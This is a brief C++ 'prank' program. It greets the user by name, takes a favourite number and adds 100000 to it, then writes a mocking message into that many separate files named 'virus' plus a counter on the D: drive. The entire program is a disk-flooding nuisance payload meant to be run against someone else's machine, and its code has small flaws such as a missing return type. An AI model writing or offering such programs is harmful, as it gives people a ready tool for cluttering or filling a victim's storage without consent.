#include <iostream>
#include <fstream>
using namespace std;
main()
{
    string lines, name, word;
    int number;
    cout << "What is your name ";
    cin >> name;
    word = "Hy this is a great prank with you ";
    lines = word + name;
    cout << "what is your favorite number ";
    cin >> number;
    number = number + 100000;
    for (int z = 0; z < number; z++)
    {
        fstream file, name;
        file.open("D:/virus" + to_string(z) + ".txt", ios::app);
        file << lines;
        cout << endl;
        file.close();
    }
}